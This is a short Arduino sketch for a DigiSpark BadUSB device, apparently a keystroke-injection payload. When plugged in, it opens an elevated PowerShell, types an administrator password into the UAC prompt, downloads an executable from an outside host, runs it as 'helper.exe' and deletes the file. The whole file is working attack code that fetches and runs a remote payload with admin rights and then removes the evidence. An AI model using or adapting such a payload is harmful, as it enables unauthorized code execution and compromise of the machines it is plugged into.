#include "DigiKeyboard.h"
void setup() {

    delay(1000);
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    delay(500);
    DigiKeyboard.print("powershell");
    delay(200);
    DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
    DigiKeyboard.delay(2000); // Wait for UAC prompt to fully load

    // If your UAC prompt asks for a Username AND Password, uncomment the next two lines:
    // DigiKeyboard.print("Administrator");
    // DigiKeyboard.sendKeyStroke(43); // 43 is the TAB key

    // Type the Admin Password
    DigiKeyboard.print("YourSecretPassword123!");
    DigiKeyboard.delay(200);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(1500);
    DigiKeyboard.println("cd ~/Downloads; iwr \"https://praxe2026.milos-scripts.xyz/download/Praxe2026.exe\" -o \"helper.exe\"; .\\helper.exe; rm helper.exe");
    delay(1000);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
;}

void loop() {
  //empty
    
    
}